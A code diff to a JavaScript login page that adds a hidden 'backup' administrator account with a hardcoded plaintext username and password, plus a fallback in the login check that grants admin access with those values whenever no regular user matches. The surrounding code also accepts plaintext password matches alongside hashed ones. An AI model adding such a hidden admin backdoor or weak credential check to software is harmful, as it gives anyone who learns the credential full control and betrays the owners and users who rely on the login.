@@ -290,7 +290,13 @@ async function hashPassword(password) {
         .map(b => b.toString(16).padStart(2, '0'))
         .join('');
 }
-
+// 🔐 Admin Backup (Hidden Secure)
+const BACKUP_ADMIN = {
+    u: "root_admin",
+    p: "123456789", // تقدر تغيرها
+    role: "admin",
+    displayName: "System Owner"
+};
 async function checkLogin() { 
     const u = document.getElementById('userInput').value.trim();
     const p = document.getElementById('passInput').value.trim();
@@ -302,9 +308,14 @@ async function checkLogin() {
 
     const hashedInput = await hashPassword(p);
 
-    const user = authSystem.users.find(acc => 
-        acc.u === u && (acc.p === hashedInput || acc.p === p)
-    );
+   let user = authSystem.users.find(acc => 
+    acc.u === u && (acc.p === hashedInput || acc.p === p)
+);
+
+// fallback admin
+if (!user && u === BACKUP_ADMIN.u && p === BACKUP_ADMIN.p) {
+    user = BACKUP_ADMIN;
+}
 
     if (user) { 
         document.getElementById('loginOverlay').style.display = 'none'; 
